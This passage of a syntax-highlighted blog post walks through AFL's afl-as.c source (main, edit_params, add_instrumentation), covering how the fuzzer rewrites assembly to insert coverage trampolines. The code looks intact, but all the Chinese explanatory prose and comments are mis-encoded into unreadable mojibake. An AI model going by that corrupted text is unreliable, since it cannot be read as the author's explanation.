class="built_in">setenv</span>(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || <span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!just_version) <span class="built_in">add_instrumentation</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit_params(argc, argv);</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼š</p><ul><li><p>è§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œå‡†å¤‡ä¼ é€’ç»™çœŸå®æ±‡ç¼–å™¨çš„å‚æ•°</p></li><li><p>æ£€æµ‹ç›®æ ‡æ¶æ„ï¼ˆ32ä½&#x2F;64ä½ï¼‰</p></li><li><p>å¤„ç† macOS ç‰¹æ®Šæƒ…å†µï¼ˆä½¿ç”¨ clang è€Œä¸æ˜¯ asï¼‰</p></li><li><p>ç¡®å®šä¸´æ—¶æ–‡ä»¶è·¯å¾„</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 *tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_AS&quot;</span>);</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">32</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) <span class="built_in">FATAL</span>(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, <span class="built_in">getpid</span>(),</span><br><span class="line">                               (u32)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line"></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå˜é‡<code>TEMP</code>å’Œ<code>TMP</code>çš„ä½¿ç”¨å‡éœ€è¦ç”¨æˆ·åœ¨æ‰§è¡Œ<code>afl-as</code>å‰æ‰‹åŠ¨è®¾ç½®ï¼Œå¦‚æœå‡ä¸å­˜åœ¨åˆ™é»˜è®¤è®¾ç½®<code>tmp_dir</code>å˜é‡ä¸º<code>/tmp</code>ç›®å½•</p><p>ç”Ÿæˆä¸´æ—¶æ–‡ä»¶åï¼š<code>/tmp/.afl-&lt;pid&gt;-&lt;timestamp&gt;.s</code></p><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>ä»¥ä¸‹æ˜¯æ ¸å¿ƒæ•°æ®ç»“æ„ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 line[MAX_LINE];           <span class="comment">// è¯»å–æ¯è¡Œæ±‡ç¼–ä»£ç çš„ç¼“å†²åŒº</span></span><br><span class="line">FILE* inf;                          <span class="comment">// è¾“å…¥æ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line">FILE* outf;                         <span class="comment">// è¾“å‡ºæ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line">s32 outfd;                          <span class="comment">// è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line">u32 ins_lines = <span class="number">0</span>;                  <span class="comment">// æ’æ¡©è¡Œæ•°è®¡æ•°å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ§åˆ¶æ ‡å¿—</span></span><br><span class="line">u8  instr_ok = <span class="number">0</span>,                   <span class="comment">// æ˜¯å¦åœ¨å¯æ’æ¡©åŒºåŸŸ(.textæ®µ)</span></span><br><span class="line">    skip_csect = <span class="number">0</span>,                 <span class="comment">// è·³è¿‡ä»£ç æ®µ(æ¶æ„ä¸åŒ¹é…)</span></span><br><span class="line">    skip_next_label = <span class="number">0</span>,            <span class="comment">// è·³è¿‡ä¸‹ä¸€ä¸ªæ ‡ç­¾</span></span><br><span class="line">    skip_intel = <span class="number">0</span>,                 <span class="comment">// è·³è¿‡Intelè¯­æ³•å—</span></span><br><span class="line">    skip_app = <span class="number">0</span>,                   <span class="comment">// è·³è¿‡å†…è”æ±‡ç¼–å—</span></span><br><span class="line">    instrument_next = <span class="number">0</span>;            <span class="comment">// æ ‡è®°ä¸‹ä¸€æ¡æŒ‡ä»¤éœ€è¦æ’æ¡©</span></span><br></pre></td></tr></table></figure><p>æ’æ¡©æ³¨å…¥ï¼Œè¿™æ˜¯ç¨‹åºçš„æ ¸å¿ƒå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process input file, generate modified_file. Insert instrumentation in all</span></span><br><span class="line"><span class="comment">   the appropriate places. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;</span><br><span class="line"></span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span 